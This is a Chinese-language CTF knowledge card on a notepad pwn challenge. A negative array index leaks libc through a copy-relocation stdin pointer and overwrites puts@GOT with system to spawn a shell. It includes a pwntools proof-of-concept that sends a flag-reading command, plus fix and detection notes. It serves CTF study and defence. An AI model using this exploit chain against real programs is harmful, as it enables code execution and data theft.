---
id: ctf-pwn-negative-index-note-array-copy-reloc-leak-got-system
title: note 数组负下标越界：view(-1) 泄露 copy relocation FILE*，create(-5) 覆写 puts@GOT 为 system
type: scenario
domain: ctf
path: ctf/pwn
technique: negative-index-note-array-copy-reloc-got-system
aliases:
- 负下标 note
- notes 数组步长 0x30
- copy relocation 泄露
- stdin FILE*
- puts@got 改 system
- notepad
tags:
- ctf
- pwn
- negative-index
- oob
- copy-relocation
- got-overwrite
- system
- libc-leak
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:21:37+08:00'
  notes: 已对照原文核对：get_note 只查 idx<=9、notes 步长 0x30、view(-1) 读 copy relocation FILE* 泄露 _IO_2_1_stdin_、create(-5) 把 content[16:24] 写到 puts@got=system、view(-5) 触发 system(sh)、scanf/read 同步坑与远端 libc 偏移 0x1ec980/0x52290，实测 ISCC{87c822a8-...} 均与卡片一致。未验证点：PoC 未本机复跑；CTF 无组件版本；frontmatter 无 sources/source_url。
---

## 一句话结论

`get_note()` 只检查 `idx <= 9` 不检查下界，`notes` 数组步长 0x30；`view(-1)` 从数组前方读到 `stdin`/`stdout`/`stderr` 的 copy relocation 指针泄露 libc，`create(-5)` 把 content 后半段压到 `puts@got` 写成 `system`，再用原本的 `view(-5)` 触发 `system("sh")`。

## 原理

- **负下标窗口**：`notes[idx]` 的地址是 `notes + idx * 0x30`；`idx` 为负时向数组前方回退，可落到 `.data`/`.bss`/`.got` 附近的不同窗口。程序只做 `idx <= 9` 的上界检查，负数完全放行。
- **copy relocation 泄露**：可执行文件中的 `stdin`/`stdout`/`stderr` 是 copy relocation，运行时由动态链接器填入 libc 中 `_IO_2_1_stdin_` 等 FILE 结构地址；`view(-1)` 的 `puts(note)` 会把这些指针当字符串打印出来。解析时不能按第一个换行截断（指针字节可能含 `0x0a`），要按 `Name:`/`Content:` 提示串切分并补零成 64 位地址。
- **GOT 覆写**：`create(-5)` 的 name/content 写入窗口覆盖到 `puts@got`；把 content 的第 16–23 字节写成 `system` 地址，程序随后对 note 的两次 `puts` 都会变成 `system`，参数分别是 name 与 content 开头。
- **同步坑**：`create` 先用 `scanf` 读 idx，再用 `read` 读 name/content；必须先单独发 idx，等 `Name:`/`Content:` 提示后再分别发数据，否则 `scanf` 会把后续 payload 吸进 stdio 缓冲区，`read` 拿不到完整内容。

## 触发条件

- note 数组用有符号下标且只检查上界。
- 数组前方存在 copy relocation 指针、GOT 项或其他可读/可写敏感结构。
- GOT 可写（Partial RELRO），程序通过 `puts` 输出 note。
- 远端 libc 与附件 libc 可能不一致，需要用泄露值重新确认偏移。

## 利用步骤

1. `checksec`/`objdump` 确认 notes 基址、步长 0x30、`get_note` 只检查上界；`objdump -R` 查看 GOT 与 copy relocation 布局。
2. `view(-1)` 读数组前方，按 `Name: ` 与 `\nContent: ` 切分，取 8 字节小端指针，减去 live libc 的 `_IO_2_1_stdin_` 偏移得到基址。
3. 用其他 GOT 泄露交叉验证 libc 版本；不要盲信附件 `libc.so.6`。
4. `create(-5)`：先发 `1`，等 `Index: ` 后发 `-5`，等 `Name: ` 后发 16 字节 name（以 `sh\0` 开头），等 `Content: ` 后发 `sh\0` + 填充 + `p64(system_addr)` + 8 字节填充。
5. 再次 `view(-5)`，程序原本的 `puts(note)`/`puts(note+0x10)` 变成 `system("sh")`。
6. 在同一连接向 shell 发送 `cat /flag*`、`find / -name 'flag*'` 等命令读取 flag。

## PoC

```python
def leak_libc(io):
    out = view(io, -1)
    name = out.split(b"Name: ", 1)[1].split(b"\nContent: ", 1)[0]
    stdin_ptr = u64(name.ljust(8, b"\x00")[:8])
    return stdin_ptr - REMOTE_IO_STDIN

def overwrite_puts(io, system_addr):
    io.sendline(b"1")
    io.recvuntil(b"Index: "); io.sendline(b"-5")
    io.recvuntil(b"Name: "); io.send(b"sh\x00".ljust(16, b"A"))
    io.recvuntil(b"Content: ")
    io.send(b"sh\x00".ljust(16, b"B") + p64(system_addr) + b"C" * 8)

base = leak_libc(io)
overwrite_puts(io, base + REMOTE_SYSTEM)
io.sendline(b"2"); io.recvuntil(b"Index: "); io.sendline(b"-5")
io.send(b"cat /flag* 2>/dev/null; exit\n")
```

## 变体与关联

- **泄露变体**：可读 `printf@got`/`read@got`/`free@got` 等 GOT 项；也可读栈上的 `environ` 指针；copy relocation 只在非 PIE 可执行文件中出现。
- **覆写变体**：可改 `printf@got`/`free@got`；若 Full RELRO 则改 `__free_hook` 或返回地址；负下标偏移随数组步长与布局变化。
- **关联卡片**：[[ctf-pwn-negative-index-hidden-slot-encoded-fptr]]（负下标读隐藏槽位）、[[binary-pwn-elf-copy-relocation-writable-security-state]]（copy relocation 可写安全状态）、[[binary-pwn-format-string-got-hijack]]（GOT 覆写）。
- **边界**：若程序对 idx 做无符号转换或双边界检查，负下标不成立；若远端 libc 偏移未知，泄露会算错，需要按 GOT 低 12 位匹配。

## 检测与防御

- **CTF 验证**：先确认 `view(-1)` 输出的是合法 libc 指针（高字节 `0x7f`），再确认 `view(-5)` 后能执行 shell 命令。
- **修复**：下标检查必须同时校验 `idx >= 0 && idx < n`；数组前不要放敏感指针；开启 Full RELRO/PIE；用 `printf("%s", ...)` 输出。
- **检测信号**：菜单出现负数索引；GOT 在运行期被改写；note 内容中出现 `sh\0` 与 libc 地址混排。
